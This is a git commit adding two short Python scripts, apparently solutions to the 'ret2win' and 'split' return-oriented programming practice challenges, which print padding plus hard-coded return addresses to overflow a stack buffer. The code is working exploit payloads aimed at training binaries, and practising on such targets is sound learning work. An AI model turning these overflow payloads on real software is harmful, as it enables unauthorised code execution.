e08c14835a3ddfca6a535a3148320cbd7263cbb6
Joerito <joelalexandreff@hotmail.com>
2020-02-02 00:43:55 +0000

    rop

---
+++ ret2win/ex.py
@@ -0,0 +1,3 @@
+p = 'A'*44
+shellcode = '\x59\x86\x04\x08'
+print(p+shellcode)
---
+++ split/ex.py
@@ -0,0 +1,4 @@
+p = "A"*44
+usefulFunction = "\x57\x86\x04\x08"
+string = "\x30\xa0\x04\x08"
+print(p+usefulFunction+string)
